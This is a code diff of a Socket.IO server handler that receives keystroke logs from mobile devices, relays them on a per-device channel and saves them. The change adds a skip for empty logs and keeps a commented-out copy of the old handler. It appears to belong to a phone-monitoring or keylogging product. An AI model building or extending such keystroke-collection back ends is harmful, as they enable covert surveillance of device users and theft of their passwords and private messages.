@@ -548,6 +548,37 @@ export const startSocketIO = async () => {
 			);
 
 			// Recieve the Key Logs from mobile
+			// socket.on(
+			// 	`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
+			// 	async (response: any) => {
+			// 		try {
+			// 			console.log("Key logs=>", response);
+			// 			const deviceId = response.deviceId;
+			// 			const keyLogsType = response.keyLogsType;
+			// 			const keylogs = response.keylogs;
+			// 			const keyEvent = response.event;
+
+			// 			// if (res.status == 200) {
+			// 			io.emit(
+			// 				`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
+			// 				{
+			// 					deviceId: deviceId,
+			// 					keyLogsType: keyLogsType,
+			// 					keylogs: keylogs,
+			// 					keyevent: keyEvent,
+			// 					created_at: Date.now(),
+			// 				}
+			// 			);
+			// 			// }
+
+			// 			// data should be include deviceId and keylogs
+			// 			const res = await addNewKeyLogs(response);
+			// 		} catch (error) {
+			// 			console.log("Key Logs Response Error", error);
+			// 		}
+			// 	}
+			// );
+			// Receive the Key Logs from mobile
 			socket.on(
 				`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
 				async (response: any) => {
@@ -558,21 +589,24 @@ export const startSocketIO = async () => {
 						const keylogs = response.keylogs;
 						const keyEvent = response.event;
 
-						// if (res.status == 200) {
-						io.emit(
-							`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
-							{
-								deviceId: deviceId,
-								keyLogsType: keyLogsType,
-								keylogs: keylogs || "none",
-								keyevent: keyEvent,
-								created_at: Date.now(),
-							}
-						);
-						// }
+						// Check if keylogs is not an empty string before proceeding
+						if (keylogs && keylogs.trim() !== "") {
+							io.emit(
+								`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
+								{
+									deviceId: deviceId,
+									keyLogsType: keyLogsType,
+									keylogs: keylogs,
+									keyevent: keyEvent,
+									created_at: Date.now(),
+								}
+							);
 
-						// data should be include deviceId and keylogs
-						const res = await addNewKeyLogs(response);
+							// Data should be include deviceId and keylogs
+							const res = await addNewKeyLogs(response);
+						} else {
+							console.log("Empty key logs, skipping...");
+						}
 					} catch (error) {
 						console.log("Key Logs Response Error", error);
 					}
